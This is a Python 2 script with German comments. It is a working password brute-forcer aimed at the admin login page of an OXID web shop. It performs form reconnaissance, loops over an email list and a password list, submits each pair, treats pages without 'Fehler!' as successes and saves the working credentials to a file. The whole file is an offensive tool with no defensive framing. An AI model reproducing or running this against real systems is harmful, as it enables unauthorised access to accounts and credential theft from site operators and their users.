#!/usr/bin/python
# -*- coding: utf-8 -*-

import re
import mechanize
from bs4 import BeautifulSoup
import cookielib

### config
login_url = "http://target.com/admin/index.php"
login_list = 'emails.txt'
pw_list = 'passwortliste.txt'
 

### prep browser
browser = mechanize.Browser()
cookies = cookielib.MozillaCookieJar('cookie_jar')
browser.set_cookiejar(cookies)
browser.addheaders = [('User-agent', 'Firefox')]
browser.set_handle_robots(False)
browser.set_handle_refresh(False)
browser.set_handle_equiv(True)
browser.set_handle_gzip(True)
browser.set_handle_redirect(True)
browser.set_handle_referer(True)
browser.open(login_url)

#prep input files
file = open(pw_list,'r')
passwortliste = file.read()
file.close()

file = open(login_list,'r')
logins = file.read()
file.close()

def how_to_use():
	return 1

def form_recon():
	print '# Doing form recon.'
	for form in browser.forms():
		print "# Form-Name:", form.name
		print "# Form-Felder:", form

def attack_oxid():
	print '# Bruting...'
	for login in logins.split('\n'):
		if login:
			for passwort in passwortliste.split("\n"):
				if passwort:
					try:
						browser.select_form(name='login')
						browser.form['user'] = login
						browser.form['pwd'] = passwort
						suppe = BeautifulSoup((browser.submit()).read())
						klarebruehe = (suppe.get_text()).encode('utf-8', 'ignore')

						if re.search("Fehler!", klarebruehe) == None:
							print "[hit!] ", login,":",passwort,"<-- Das Ergebnis wurde in treffer.txt geschrieben."
							file = open('treffer.txt','a')
							file.write('Login: %s\npasswort: %s \n' %(login,passwort))
							file.close()
							break
						else:
							print "[miss] ",login,":",passwort
							pass
					except:
						print "Fail", passwort
						break

form_recon()
#attack_oxid()
